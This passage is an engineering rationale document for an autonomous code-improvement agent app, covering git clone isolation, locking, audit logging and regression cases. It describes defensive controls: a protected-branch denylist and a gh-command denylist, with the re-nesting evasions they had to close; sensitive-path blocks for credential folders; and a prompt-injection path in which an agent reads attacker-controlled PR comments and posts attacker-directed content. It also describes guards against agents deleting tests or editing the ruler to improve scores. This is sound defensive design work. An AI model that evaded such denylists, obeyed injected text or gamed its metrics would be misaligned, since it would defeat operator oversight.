`origin/origin/origin/…` cannot spin.

This came out of applying a review finding about a *different* denylist — the shell
refusal, which was evadable by re-nesting a command — to this one. The lesson worth
keeping is the general one: **any normalization that runs once can be re-nested**, so the
test enumerates the respellings git accepts instead of the two that came to mind.

### Why branch checkout prefers the remote-tracking ref over a fetch

The same root cause, found by looking for it: **code inside a deliberately push-disabled
clone cannot reach the remote for READS either.** `checkout_branch` fetched
`origin/<branch>` and, on failure, fell back to a LOCAL branch of that name. In a fresh
clone a local branch exists for the DEFAULT branch only, so for every other target the
fetch failed (exit 128, always — the origin is neutralized), the local lookup missed, and
the function returned `(False, "could not fetch …")`.

The caller then makes it silent: without `scopeDiffBase` set, a failed checkout logs a
warning and **starts anyway**. The run discovers, edits and measures `main` while the
operator believes it is working on the branch they configured — exactly the kind of failure
that produces confidently-reported nonsense.

The DRIVER has the mirror-image of this bug, found in the same review: its stage steps
checked out `self.branch` in the config form (`origin/main`), and `git checkout origin/main`
detaches HEAD onto the remote-tracking ref — so each cycle's kept commit was orphaned and
the next cycle's checkout discarded it. Both stage sites now check out
`normalize_branch(self.branch)`, the local branch `runner` created before the loop started,
so cycle N+1 builds on cycle N.

The clone already has `origin/<branch>` for every branch that existed at clone time, so the
fix needs no network: try the remote-tracking ref first (`checkout -B <branch>
origin/<branch>`), then a local branch for the genuinely-offline case, and only then fail. A
branch that exists in neither still fails — turning a missing branch into a false success
would be worse than the bug, since the run would proceed on the wrong tree with an `ok`
verdict.

### Why one-click commit fetches through the configured url, not `origin`

Neutralizing both origin urls has a consequence that is easy to miss: **nothing inside the
clone can reach the remote, including the reads.** `commit_finding` fetched its base with
`git fetch --quiet origin <branch>`, which exits 128 in every clone the loop works in, so
one-click commit failed before applying its queued diff. Measured against a local bare
repo: fetch by remote name succeeded before the neutralization and failed with
`'DISABLED_NO_PUSH' does not appear to be a git repository` after it.

It now fetches through the same validated `origin_url` the push already used — one lookup
serving both — into `refs/auto-improvement/commit-base`, a ref this module owns, and
checks out / resets / diffs against that ref. Falling back to `origin/<branch>` would
have been the smaller change and the wrong one: in a frozen clone that tracking ref is a
snapshot from clone time, so committing on it silently drops whatever landed upstream
since — a lost update that reports success. With no configured url at all the function
degrades to committing on the stale local ref (the push cannot succeed either, so the
outcome is "committed locally only") rather than pretending to publish.

Worth recording *why this survived*: every pre-existing test for `commit_finding`
exercised a refusal path — no queued diff, protected branch — so the whole suite passed
green while the success path was dead. The regression test drives the real function against
a real bare repo with the origin neutralized exactly as production leaves it, and a second
case advances the branch upstream first to pin that the base is fetched rather than
remembered.

### Why drafting a PR needs a push

The upstream review CLI uploaded commits through a side channel that was not the
git remote, so it could draft a review from inside a push-disabled clone. GitHub
has no such channel — a PR is a comparison between two refs that both exist on
the remote. The fix branch is therefore pushed, and the relaxation is narrowed the
same way the spine's direct-commit mode narrows it: a generated app-namespaced
branch, pushed to the origin **fetch** URL for that one ref while the push remote
stays `DISABLED_NO_PUSH` for everything else, and run through the protected-branch
denylist first. A refused or failed push degrades to the durable queue
(`pr_queue/<fp>.diff` + `.pr.md`) so a verified change is never lost.

### Why every ``{fp}`` route validates at the boundary

The finding fingerprint from a URL is interpolated straight into a filesystem path —
``pr_queue/<fp>.diff``, the per-repo ledger subtree, a watcher clone dir — so an
unvalidated ``fp`` is a path-traversal vector (``..``, an absolute path, a value with a
slash). Nine handlers took ``fp`` from ``match_info``; some downstream sinks validated
(``ledger_admin.forget``/``purge``) and some did not (``commit_finding`` via
``pr_queue_dir``, the watcher clone path). ``_validated_fp`` now runs
``ledger_admin.validate_fingerprint`` (allowlist ``^[A-Za-z0-9][A-Za-z0-9_-]{0,63}$`` — no
``.``, ``/`` or ``..``; rejects rather than sanitizes) at the HTTP boundary for all of
them, matching the input-validation guidance: allowlist at the point of origin, block
traversal, fail closed.

### Why calibration pins its workspace

Findings, the ruler, the PR queue and profiles are scoped per repository+branch, and the
path helpers derive that scope from live ``config.json``. Calibration runs on a background
thread and can take seconds to minutes, so reading the scope at WRITE time let an operator
retarget mid-run and land the ruler in a different workspace — overwriting a ruler
calibrated on unrelated code. The ``_calibrate_loop`` write now derives its path from the
config the worker was LAUNCHED with (``workspace_key(config)``), not the live file.

### Why operator clone mutations hold one lock

The run-active gate above stops the commit and draft routes racing the LOOP. It does not stop
them racing EACH OTHER, and both mutate the same `config["clone"]`: the dashboard's commit icon
had no `disabled` while pending, so clicking two `filed` rows started two mutations, each in its
own `asyncio.to_thread` thread.

Measured on a real bare repo: A stages its diff; B's `checkout -B <branch> <base>` does **not**
discard it (the branch is already at that base, so no files change); B's `git apply --index`
stacks on top; and B's commit contains **both** findings — so the commit recorded as B publishes
A's change too. Worse, A's now-empty commit then fails and its `reset --hard` rewinds the local
branch past B's already-pushed commit, leaving the local branch missing what the remote has.

`commit.clone_lock()` (an `RLock`, module-level because there is exactly one configured clone)
serializes every operator-triggered mutation. The draft route holds it across its **whole**
sequence — materialize → commit → draft → rollback — not around each call, because the race is
between the steps. The button is additionally disabled while any commit is in flight, which
stops the operator queueing work rather than being the correctness mechanism.

The regression test FORCES the interleaving by parking thread A immediately after it stages,
rather than starting two threads and hoping: the plain race reproduced the bug only about one
run in three, which is too flaky to guard anything. Deterministic now — it fails 3/3 without the
lock and passes 3/3 with it. Raised by the Opus 5 review of this branch.

### Why the manual draft path materializes its own diff

``pr_recipe.draft(diff=...)`` only WRITES the queue copy; the branch content comes from
``_push_fix_branch``, which pushes the clone's ``HEAD``. In the loop that is correct — the
driver's ``_stage_winner`` applies the winner into the shared clone before the pipeline drafts
(that ordering is itself a fix from an earlier review). The backend's **manual** draft button
had no such step, so drafting an OLDER queued finding published whatever a LATER cycle had
left at ``HEAD``: measured against a real bare repo, finding A's queued diff adds
``FINDING_A`` and the branch pushed for A contained ``FINDING_B`` — the pull request's
metadata and its content disagreeing, which is worse than a failed draft because it looks
successful.

And committing means every later failure has to ROLL BACK. The commit sits on the configured
branch, and ``clone_setup.checkout_branch`` prefers an existing local branch — so a draft that
published nothing (no ``gh``, no network, a refused push, or an unexpected raise) would leave
the next run starting from an unfiled commit and treating the queued change as already-landed
baseline. Measured on a real bare repo: local ``work`` sat 1 commit ahead of a remote it had
never been pushed to. All three post-commit exits now ``reset --hard`` to the fetched base,
which is what ``commit_finding`` already did at each of its own failure points; the durable
queue copy is untouched, so a retry still has everything it needs.

Staging is not enough on its own: ``git apply --index`` populates the index but does not move
``HEAD``, and ``_push_fix_branch`` pushes ``HEAD:refs/heads/<branch>``. The first version of
this fix therefore published the BASE with the queued fix absent — measured on a real bare
repo, the worktree read ``return 2`` while the pushed branch still read ``return 1``. The
route now commits via ``commit_staged_for_draft`` (reusing the redaction-hardened
``_commit_message``, since a pushed commit message cannot be edited without rewriting
history). Worth recording why this slipped through: the first regression test asserted the
WORKTREE, which agreed with the fix, so it passed while the published branch did not. The test
now performs a real push and reads the content back off the remote.

Making the route materialize its diff also made it clone-MUTATING, which means it needs the
run-active gate every other clone-mutating handler already had — and the first version of this
fix did not add it. `checkout -B` / `apply --index` (plus `reset --hard` on a failed apply) run
in `config["clone"]`, the same tree the driver's worker thread is mid-cycle on
(`_stage_winner` / `_commit_winner_provisional` do checkout/apply/`add -A`/commit on that
branch), so an interleaved draft discards the loop's staged winner and then pushes whatever
HEAD the interleaving left — reintroducing the exact mismatch this fix exists to prevent. The
route now returns 409 `run_in_progress` while the supervisor is RUNNING/CALIBRATING/STOPPING,
identical to `_handle_commit`, and a structural test asserts BOTH handlers carry the gate so
the next clone-mutating route cannot repeat the omission. Raised by the Opus 5 review.

The fix reuses the one place that already does this correctly. ``commit.py``'s one-click
commit fetches the real base, ``checkout -B``, then ``git apply --index``; that block is
extracted as ``materialize_queued_diff`` and called by BOTH paths, so the draft route stages
finding A's diff on the remote branch before drafting and a failed staging returns an error
instead of drafting anyway. Extracting rather than duplicating matters here: the base-ref
resolution carries two earlier fixes (fetch through the configured url because both origin
urls are neutralized, and never trust the frozen ``origin/<branch>`` tracking ref), and a
second copy would have drifted from them.

### Why an unproven ruler halts the perf track (a reversed decision)

``canaryAdvisory`` defaulted to ``True``, so a perf run whose canary failed to clear the band
still entered Phase 2 and could keep and draft a "win" measured by a ruler that was never
proven. Review asked for a ``False`` default twice; the first response declined it on this
argument, recorded here in an earlier revision of this document:

> Defaulting to strict would halt every run on such a target — including bug-track runs,
> which never consult the ruler.

**That argument is wrong, and the code says so.** ``Driver.run`` skips Phase-1 preflight
*entirely* for the bug track — "preflight: skipped for bug track (RED→GREEN gate is the
verdict; no noise band)" — so a strict canary cannot reach a bug run at all. The stated cost
of strictness does not exist, which leaves nothing on the other side of the scale from
03_metric §7.1 ("an unproven ruler must HALT"). The default is now ``False``.

The target-suitability limit that motivated the loose default is real and unchanged: on an
arbitrary Python repo there is no genuine known win to force, so ``measure_canary`` forces
the one mechanical win available (collect-only on the candidate arm), which is a real
correctly-signed delta but a **lower bound** on sensitivity rather than proof the ruler
resolves a 3% win; on a repo whose suite runs in about its own collection time there is no
win to force at all. The right answer for such a target is an explicit operator opt-in
(``canaryAdvisory: true``) or a ``benchmarkCommand`` pointing at a real workload — not a
default that quietly lowers the bar for everyone. ``TestAnUnprovenRulerHaltsThePerfTrack``
pins the strict default, the surviving opt-out, and the bug-track premise, so if preflight
ever stops being skipped for the bug track the justification has to be re-derived rather
than silently inherited.

The disclosure half of the earlier response stands on its own and is kept: a perf pull
request headed "Evidence it's a real win" said
nothing about the ruler's proof status, leaving a reviewer unable to tell "band proven to
resolve this" from "band is a floor". ``perf_pr_description`` now takes ``ruler_proven`` and
emits a caveat block when it is False; the driver sets it from ``PreflightResult.canary_cleared``
after preflight (the pipeline is built before preflight runs, so it cannot be a constructor
argument). It defaults True so a stub or unit-test caller keeps today's wording — crying wolf
on a proven ruler would train reviewers to ignore the warning.

### Why the subprocess fallback audits every tool it uses

The fallback logged ONE blanket launch event (``tool_name="claude-cli"``, ``critical=True``)
before spawning. That records "an unattended agent started" and says nothing about which
tools it then ran, so a forensic query could not answer "did this run touch a shell?". The
session path gets per-tool events from its approval hook; the fallback was already parsing
``tool_use`` blocks out of the stream — that is what drives the UI activity feed — and simply
never persisted them. The information was present and thrown away.

``_audit_fallback_tool`` now records each one. Deliberately NOT ``critical=True``, unlike the
launch event: by the time it fires the tool has already run inside the sandbox, so raising
could not prevent anything and would only turn an audit-sink problem into a failed run. The
audit-or-DENY half of this path is the launch event plus the pre-spawn governance gate and
the shell denylist; this is the audit-or-RECORD half. The target hint is agent-influenced
text landing in a log that is signed as-written, so it is redacted and truncated, and a
redactor failure emits ``[redaction unavailable]`` rather than raw text.

Review asked for the fallback to be DELETED instead. That is still declined — it is the only
path that authors fixes when no in-process provider is configured — but the audit gap it named
was real, and closing it is what the request was actually pointing at.

### Why the MCP dispatch is audited before the handler runs

The server audited only OUTCOMES, and every outcome event fires after ``fn(args)`` returns or
from an ``except`` block. So a handler that died in a way this frame cannot catch — a killed
process, an interpreter-level failure — executed a tool with no audit trail at all. The
dispatch is now audited with ``outcome="invoked"`` *before* the handler runs (``invoked`` is
the established SEL token for this, not a new synonym), and the outcome event still follows.
A served call therefore logs twice, which a test pins as an ordered pair.

That pre-dispatch event is also ``critical=True`` — audit-or-DENY: it is written
synchronously and a filesystem failure is re-raised, so a call that cannot be recorded is
REFUSED (``INTERNAL_ERROR``, "the security audit log is unavailable") rather than served
untraced. The OUTCOME events stay fail-soft, because by then the handler has already run and
raising could not prevent anything.

An earlier revision of this section argued the opposite — that all six handlers are pure
reads, so gating them traded capability for no security gain. That reasoning weighed blast
radius, but the criterion ``sel`` itself states is ATTENDEDNESS: "pass ``critical=True`` when
the caller enforces audit-or-deny (e.g. an unattended heartbeat auto-approve)". This server is
exactly that shape — no human in the loop, results handed to an LLM — so the audit event is
the only record that a read ever happened. The review that kept pressing on this was right,
and the earlier refusal is corrected here.

### Why no builtin agent pre-authorizes a tool

``allowedTools`` auto-approves a tool, and an auto-approved tool never reaches the platform
governance chokepoint. This is not an inference — it is this repo's documented architecture:
``hooks.on_tool_call`` runs only from the ``EVENT_PERMISSION_REQUEST`` branch, while the
``EVENT_TOOL_CALL`` branch is informational-only ("the tool is already running (auto-approved
by kiro-cli), so hook results cannot block execution"), and
[governance.md](governance.md) states the consequence outright: an agent that writes itself
into ``allowedTools`` makes kiro-cli stop sending permission requests and **Plane A never
runs at all** for that tool.

``discovery.json`` pre-authorized ``fs_read``/``fs_write``/``execute_bash``, so the gate the
unattended runner was wired through — the enterprise ceiling, ``BUILTIN_DENIED_RULES``, and
the ``~/.aws``/``~/.ssh`` sensitive-path blocks — was inert for precisely the tools a
repository prompt injection would reach for. ``allowedTools`` is now ``[]``.

``tools`` is deliberately RETAINED: the agent can still request those tools, and each
request is then governed and audited. Only the blanket pre-approval is gone. This matches the
sibling ``pr-author.json`` (which ships no ``allowedTools``) and the computer-use precedent
of granting ``tools`` but deliberately not ``allowedTools``. The GenAI tool-use security guidance
asks for exactly this posture — least privilege, default deny, "ensure restrictions are
placed on tool access to prevent unintended access".

### Why a landed manual commit supersedes its ``filed`` row

One-click commit pushed the queued diff and returned the sha, but wrote nothing to the
ledger. The ledger is last-write-wins per fingerprint, and ``filed`` is what ``filed_crs()``
feeds the pull-request watchers and what the UI reads to decide whether to offer the commit
button — so a change already on the branch kept reporting as an open pull request and the
operator was invited to commit it a second time. The loop's own direct-commit path records a
``committed`` row; the manual path now does too, through
``ledger_admin.record_committed``, so the two agree about the same outcome.

It writes ``cr`` and never ``pr``, for the reason spelled out for the purge event:
``LedgerEntry(**row)`` is a fixed-field dataclass, so an event carrying an unexpected key
raises ``TypeError`` inside ``_load()``'s torn-line handler and vanishes — leaving the
record ``filed`` after all. Bookkeeping failure is logged and returns False rather than
raising: the push already succeeded, so it must not surface as an error the operator retries.

### Why a rejected provisional commit discards its diff

The provisional commit stages the winner with ``add -A`` and then commits. When the commit
FAILS — a rejecting ``pre-commit`` hook, gpg/signing trouble — the helper correctly returns
False, but the diff stays in the index, and the next candidate's ``add -A`` sweeps it into
*their* commit. Measured on a real repo with a rejecting hook: candidate B's commit carried
candidate A's rejected, never-verified change to ``m.py`` alongside B's own file. That is the
same failure class as publishing an unverified rebase — unmeasured code reaching a branch.

``_discard_staged`` (called from both the perf and bug helpers) collects the patch's ADDED
paths from the index *before* resetting, then ``reset --hard`` and removes those paths.
The order matters: ``reset --hard`` un-stages a created file but leaves it untracked on
disk, where the very next ``add -A`` picks it straight back up. Removing only the paths the
patch added keeps this targeted — a blanket ``git clean`` would also delete unrelated build
output in the operator's clone.

### Why a rebased commit is re-verified before it is published

A run takes tens of minutes, so the authorized branch can legitimately advance between the
clone's fetch and the winner's push. A bare push then dies ``! [rejected] ... (fetch first)``
and strands a fully verified fix — measured on this app's own dogfood, 3 of 6 gate survivors
were lost that way. Hence the single narrow rebase-and-retry in ``_push_with_rebase``.

The subtlety is that **a clean rebase is a statement about text, not about behaviour.** The
gate result the driver is holding was measured against the PRE-rebase base; replaying the
commit onto a moved branch produces a tree that nothing has ever built or tested. Measured on
a real repo: our commit added ``g() -> 2``, the branch meanwhile gained a NEW FILE asserting
``g() == 3``, the rebase exited **0** (disjoint paths, nothing to conflict) and the combined
tree was **RED**. Pre-fix, that red tree was pushed to the shared branch — exactly what a
measurement-first pipeline exists to prevent.

So the replayed tree is re-verified through the profile's own build gate
(``_reverify_head``) before the retry push, fail-CLOSED: a gate that returns False *or*
raises returns the original rejection, leaving the verified commit local and recoverable.
Deleting the retry outright (the reviewer's suggested fix) would reinstate the measured
3-in-6 loss, so the invariant is restored without giving up the recovery.

The ledger also has to record the sha that actually **landed**: a rebase rewrites HEAD, so
the caller's pre-push snapshot names a commit absent from the remote (measured: ``eb828444``
before, ``11aff54a`` after). ``_direct_push`` reads HEAD back after the push and both
committed-status rows record that, so an audit of "what did the bot land?" resolves.

## Storage

Under `app_data_dir("auto-improvement")` (i.e. `$KIROCREW_HOME/apps/auto-improvement/data`):

```
config.json          run configuration
ledger.jsonl         append-only findings ledger (dedup by content fingerprint)
ruler/ruler.json     calibrated ruler (atomic write)
results/             run metadata, results.tsv, per-candidate diffs
pr_queue/            <fp>.diff + <fp>.pr.md — durable draft-PR queue
profiles/            normalized profiler frame trees
sessions/<key>.json  chat-session records (resume)
logs/
```

Disposable clones and worktrees live **outside** `data/` under
`~/.autoimprove-scratch` (override: `AUTO_IMPROVEMENT_SCRATCH`), because they are
large, regenerable, and must not be mistaken for the durable record.

`write_json_atomic` (tmpfile + `os.replace`) is load-bearing rather than
stylistic: the upstream app used a plain write for the ruler and readers caught it
mid-truncate ~31% of the time, reporting a calibrated ruler as uncalibrated.

Session record keys are validated against `^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$` and
rejected — not sanitized — when unsafe, because silently rewriting a key would
make two subjects share one record. The frontend sanitizer strips dot-runs and
path separators before the key is ever sent, so the two gates agree.

## Chat integration

Three tiers, each where it fits:

1. **Resumable per-subject sessions** (`website/src/apps/auto-improvement/lib/agentSession.ts`)
   — `createSlot` → `renameSlot` → `sendChat` → `switchSlot`, with
   `{slot_key, folder_id}` persisted via `PUT /sessions/{key}` so a repeat click
   resumes. Sessions are filed into an `Auto-Improve - <repo>` folder. A 404 from
   `switchSlot` (and only a 404) means the slot is gone and a fresh one opens;
   treating a transient error that way would orphan a live session.
2. **Silent background sessions** for the autonomous loop's own agent runs, so a
   run produces no agent cards, approval prompts, or reaper slots.
3. **Fire-and-forget launcher** for one-shot discussions.

Subject kinds are `pr | finding | ruler | run`, and the record key is
kind-namespaced so `finding-7` and `pr-7` are different conversations.

Seed prompts (`lib/prompts.ts`) all append the same two constraints — never
publish/merge the PR, and never edit the ruler or harness to improve a number.
A frontend test asserts every surface carries them, so a new surface cannot forget.

## Keep/draft ordering invariant

A cycle must **apply → draft → commit**, in that order, in both tracks.

`pr_recipe._push_fix_branch` pushes the shared clone's `HEAD`, so the winner has to be in
that tree before the pipeline drafts. Drafting first published a branch that did not contain
the fix — or one carrying a previous cycle's commit. Three things look like they would
prevent that and do not: the queue copy carries `winner.diff` (so the *queued* artifact was
always right), `gated_commit_sha` feeds the reproduce **measurement** rather than the draft,
and `gate_res.commit_sha` is the throwaway **worktree's** head.

Staging is not enough, and a first attempt at this fix got it wrong: `git push
HEAD:refs/heads/<b>` sends the **commit** HEAD points at, while `git apply` + `git add -A`
only touch the index. Verified against a local bare repo — a staged-but-uncommitted fix
pushed the ORIGINAL file content. The fix has to be a real commit.

But the commit MESSAGE needs `outcome.reproduce`, which only the pipeline produces, and
authoring the final message first would silently degrade it to echoing VERIFY (§3.1/§3.2).
So the sequence is **provisional commit → draft → amend**:

1. `_commit_winner_provisional` / `_commit_bug_winner_provisional` apply the diff and commit
   it with a placeholder message, so HEAD carries the fix when the recipe pushes.
2. The pipeline reproduces and drafts.
3. `_finalize_winner_commit` / `_finalize_bug_winner_commit` `--amend` that commit with the
   attributable message and the real reproduce numbers. The tree is untouched, so the
   commit the PR points at and the commit on the branch stay identical.
4. `_reset_provisional` hard-resets to the pre-commit sha when nothing was filed (fluke,
   duplicate, error), so a non-win never advances HEAD.

A diff that will not apply is refused *before* the expensive reproduce A/B.
`TestWinnerIsInTheTreeBeforeDrafting` pins the order and the rollback in both tracks.

## Startup ordering invariant

`backend/runner.py` must check out the configured branch **before** calling
`build_profile`, in both the run path and the calibration path.

The profile resolves `scopeDiffBase` in its *constructor*, via
`scoped_relpaths(clone, base)`, which diffs `base...HEAD`. Built while the clone is
still on the repo default branch, that diff comes back empty, `scoped_relpaths` returns
`None` meaning "no scope", and the edit fence silently widens from "what this branch
changed" to the whole repository — the opposite of what setting a diff scope is for.
Calibration has the same requirement for a different reason: it *measures* the suite, so
a baseline and noise band collected on the default branch would be used to judge
candidates on a feature branch.

When a `scopeDiffBase` is configured and the checkout fails, the run **refuses to
start** rather than proceeding unscoped. Without a diff scope a failed checkout stays
best-effort, as before. `TestCheckoutPrecedesProfileBuild` pins the ordering.

## Spine / profile seam

The engine (`spine/`, ~7.8k lines) consumes a target only through a six-field
`TargetProfile` protocol: `ruler`, `build_gate`, `edit_allowlist`, `isolation`,
`pr_recipe`, `calibration`. The protocols are `runtime_checkable`, so the loader
validates a profile object before the driver trusts it. Adding a new target means
adding a profile, never editing the engine.

`profiles/github_repo/` is the reference profile.

## Frontend

`website/src/apps/auto-improvement/AutoImprovementPage.tsx`, routed at
`/auto-improvement` via `builtinRegistry.ts`, code-split into its own chunk.
React Query for all server state; `i18nT` for every user-facing string (keys under
`autoImprovement.*`, present in all 10 shipped catalogs); lucide icons only.

## Parity with the upstream app

All 26 upstream endpoints are covered. The vocabulary is renamed (change request →
pull request) and four upstream paths map onto differently-named equivalents:
``cr-checks`` → ``pr-status``, ``cr-sessions*`` → ``watchers*``, ``draft-cr`` →
``draft-pr``, and ``status``/``activity``/``stop`` fold into ``run``/``run/stop``.

### Audited gap state

An audit against the upstream engine diffed the engine
module-by-module. The ``spine/`` port is faithful — six modules byte-identical modulo
whitespace, ``driver.py`` structurally line-for-line, and all six safety invariants
(push-disabled clone, draft-only, protected-branch denylist, edit-allowlist reward-hack
guard, do-not-pollute gate, second independent reproduce) present and equivalent.

Every gap the audit identified is now closed:

| Gap | Severity | Resolution |
|---|---|---|
| ``--dry-run`` crashed on entry | high | ``spine/stub_profile.py`` re-export shim restored; 4 tests |
| Perf track could not propose at all | high | ``author_perf_fix`` + per-track dispatch in the proposer; 17 tests |
| Profiler capture never ran (endpoints always empty) | med | driver calls ``profile.capture_profile`` per perf candidate, after the timed arms; 9 tests |
| Auto-fixer reconciler absent | med | ``reconcile_failing_prs`` + ``promote_deferred`` + ``MAX_ACTIVE_WATCHERS`` cap, driven from the polled ``GET /watchers``; 32 tests |
| Activity buffer 25× smaller | low | ``ACTIVITY_MAXLEN`` 200 → 5000 |
| ``autoPublish`` gate dropped | low | ``auto_publish_gate`` + the ``autoPublish`` key — fail-closed, ``gh pr ready`` only |
| ``autoPublish`` could never fire | med | ``summarize_checks`` omitted ``total``, which that gate reads to prove a PR is green rather than merely un-red — so every green draft was refused with "no checks ran". Found by review of this branch; ``total`` is now derived from the four buckets, with a regression guard that fails without it |
| Orphan-clone sweep absent | low | ``sweep_orphan_clones``, name-shape-matched and symlink-safe |

Three deliberate, documented DIVERGENCES remain — they are design decisions, not
missing work, and each is narrower than upstream on purpose:

* **No mechanical perf seeds.** Upstream shipped ~24 hand-written seeds per target
  because its two profiles optimized one specific service. A target-agnostic profile
  cannot ship those, so the perf edit is authored by the model and judged by the same
  A/B measurement. The seam is open for a repo-specific profile to add seeds.
* **A watcher's fixes cannot reach the PR head branch.** The per-watcher clone has a
  dead origin (the isolation control), and GitHub has no upload side channel, so each
  pass exports its diff to the PR queue instead. See ``pr_watchers``.
* **``autoPublish`` marks ready-for-review only.** Never merges and never enables
  auto-merge, even when upstream would have.

State of the two tracks: the **bug track** has discovered, fixed, gated and
auto-committed a real defect end-to-end (``keeper.py`` rendering ``±None``). The **perf
track** is now structurally able to run end-to-end but has not yet kept a measured win
against a real repo — a wall-clock suite ruler needs a target whose suite is long enough
to resolve a win above the noise band (see the advisory-canary note above), which is a
target-suitability limit rather than a wiring gap.

Three upstream modules are deliberately NOT ported, because an in-process builtin
makes them dead weight rather than because they were missed:

| Upstream | Why it is gone |
|---|---|
| `proxy_auth.py`, `middleware.py` | the gateway authenticates same-origin requests; there is no proxy hop to sign |
| `app.py`, `bin/` launcher | `register_routes(app)` mounts on the gateway's own aiohttp app — no second process, no port |
| `config.py` | paths come from `store.py`, which reads the Kiro Crew data home |

One transport difference: the upstream served its MCP tools over HTTP on its own
allocated port. A builtin has no port, and the app bridge deliberately SKIPS a
URL-based MCP entry when there is no live backend (a dead default-port URL would
poison every session's provider config), so the tools ship as a **stdio** server
instead — `backend/mcp_server.py`, six read-only tools, all auto-approvable.

## Tests

Automated coverage is the unit and regression suites below. The endpoint surface,
the frontend cases and the full keep-or-revert loop against a real GitHub repository
are covered by the **manual acceptance plan** further down, not by an automated
integration test — nothing in the tree runs the full loop against a live repository.

- `src/kiro_crew/apps/builtins/auto_improvement/tests/` — 439 tests covering verdict
  derivation, check summarization, provider-error degradation, PR-recipe protocol
  conformance, branch naming, draft-only policy, queue degradation, the audit-or-deny
  approval, MCP dispatch auditing, and evidence redaction. Not in default `testpaths`;
  run with an explicit path.
- `test/test_bug_*.py` — reproducing tests for four defects the app found in its own
  code while dogfooding. They live under `test/` so the default `testpaths` runs them:
  a regression guard nobody executes is not a guard.
- `website/src/test/autoImprovementSession.test.ts` — 13 tests covering session-key
  namespacing/sanitization and prompt constraints.
- `website/src/test/autoImprovementActivity.test.ts` — 6 tests over the activity-feed
  line builder, including app-locale (not host-locale) time formatting.

### Regression cases

Each row is a defect this app shipped once; the assert is what keeps it shipped-once.

| # | Regression | Assert |
|---|---|---|
| D-1 | Nested-path evidence join | `GET /findings/{fp}` returns non-empty `signature`/`hypothesis` for a target like `src/pkg/sub/mod.py::Sym`. The slug must come from the **basename** (`mod_py_sym`), matching `proposer._short`; slugging the full path does not match, which would show a nested finding's diff with no explanation. |
| D-2 | Repro-test filename | The gate collects the test the agent **actually wrote**, not a name invented from the target slug — a name invented from the target slug also collides between distinct targets. |
| D-3 | Target-repo `addopts` | Gate pytest runs pass `-o addopts=`, so the target's coverage/xdist config does not apply. Measured: collecting one trivial test took **73.9 s** with addopts vs **0.17 s** without. Note `PYTEST_ADDOPTS=""` is *inert* — env addopts are appended to the ini value, not a replacement. |
| D-4 | Full-suite feasibility | Full-suite gate steps use xdist and scope to the edit-allowlist region when narrowed. On a monorepo the whole-repo suite times out and returns the unparseable sentinel, which reads as "regressed" for every candidate. |
| D-5 | ANSI in lint output | `_lint_findings` strips SGR **before** parsing (ruff colorizes even when piped), so tokens carry real rule codes. Without that strip every code parses EMPTY and T1's set-difference is unreliable. |
| D-6 | Push race | A `non-fast-forward` push retries once after fetch+rebase; a conflict aborts; **never `--force`**. Without the retry a concurrent push silently drops gate survivors. |
| D-7 | Cycle-cap starvation | With the default budget, a multi-surface discovery does not leave most findings at `seen`. A cap that starves discovery leaves most findings at `seen` with budget unspent. |
| D-8 | Subagent orphaning | The discovery agent runs under a **tool-scoped** agent (no `@kirocrew-core`, hence no `spawn_sub_agents`) yet still has `fs_read`/`grep`/`execute_bash`. Assert a terminal state with no `Reaper: force-killing` lines. |
| D-9 | `--dry-run` | The driver's `--dry-run` completes; `spine/stub_profile.py` is importable. |
| D-10 | Do-not-pollute | Host state hash unchanged across a run; a nonzero diff blocks. |
| D-11 | Reward-hack guards | A candidate deleting tests to go faster is rejected (`test_count_unchanged`); the edit fence forbids touching `tests/**` on the perf track. |
| D-12 | One-click commit in a push-disabled clone | `commit_finding` fetches its base through the validated configured url, NOT `git fetch origin` — every clone the loop works in has BOTH origin urls neutralized, so the remote-name form exits 128 and the commit died before applying its diff. Measured against a local bare repo. Every prior test covered a refusal path, so the suite was green while the success path was dead. |
| D-13 | Protected-branch respellings | `refs/heads/main` / `origin/refs/heads/main` are the same ref as `main` and git accepts all three; `normalize_branch` strips ref+remote prefixes REPEATEDLY until stable (one ordered pass still let the nested form through). `branch` is client-writable via `PUT /config`, so this is reachable. |
| D-14 | The leak detector detects leaks | `spine/pollute.py` was a blocking gate with no test: a same-length in-place edit, a deletion, a re-pointed symlink and a created-from-absent path must each report a non-zero diff, and an exclude must not blind the rest of its root. |
| D-19 | Every reader redacts, incl. progress + detail-whole-tree | The progress series (`description` = candidate prose) and the finding-detail `run`/gate blocks reached the dashboard unredacted. Both handlers now wrap the WHOLE payload in `_redact_tree`; the reader-sweep test enumerates all seven so an eighth cannot be added silently. |
| D-27 | Provisional commit fails closed | Both `_commit_winner_provisional` / `_commit_bug_winner_provisional` check `git commit`'s return code; a rejected commit (hook/gpg/empty index) returns False and leaves HEAD unmoved rather than reporting success and letting the pipeline draft/push a HEAD without the fix. |
| D-39 | Unresolvable scopeDiffBase refuses | `scoped_relpaths` returns None for a blank ref, a git FAILURE, and a valid-but-empty diff alike, so an unresolvable `scopeDiffBase` silently widened the edit fence to the whole repo. The profile now refuses an unresolvable ref (`_ref_resolves`) while still allowing the legitimate base==HEAD empty-diff case. |
| D-37 | Governance hook fails closed | A broken/unavailable `hooks.on_tool_call` layer now DENIES (returns a reason) rather than authorizing the unattended tool — the gate catches sensitive-path/enterprise-ceiling cases the app-local allowlist does not, so fail-open silently dropped them. |
| D-72 | An unproven ruler halts the perf track | `canaryAdvisory` defaulted to True, so a perf run whose canary FAILED still entered Phase 2 and could keep + draft a win measured by a ruler that was never proven. A strict default is required here; a permissive one DECLINED it because "strict mode would halt bug-track runs, which never consult the ruler". Re-derived against the code: `Driver.run` skips Phase-1 preflight ENTIRELY for the bug track ("preflight: skipped for bug track"), so a strict canary cannot reach a bug run — the stated cost does not exist and the decline was reversed. Default is now False (03_metric §7.1); the flag survives as an explicit operator opt-out for a target whose suite cannot force a measurable win. Three tests: the strict default, the surviving opt-out, and the bug-track premise itself — so if preflight ever stops being skipped there, the justification must be re-derived rather than inherited. |
| D-73 | A watcher cannot publish to the pull request | The `gh` denylist refused `pr merge`/`pr ready`/`pr close`/`api` but allowed `gh pr comment`. A watcher's job is to READ review comments and PR bodies — attacker-controlled text — so an auto-approved comment turns "the agent read a malicious comment" into "the agent posted attacker-directed content under the operator's identity". Review reported `pr comment`; `pr review`/`pr edit`/`pr create`/`issue comment`/`issue create`/`issue edit`/`issue close` are the same capability under other names and were added with it, because naming only the reported instance is how this denylist was evaded three times already. Nothing legitimate is lost: the app's own draft PR is built by `pr_recipe.py`, which constructs its argv directly and never passes through the denylist. The test also covers the global-option, wrapper, nested-shell and separator evasions for the new verbs. |
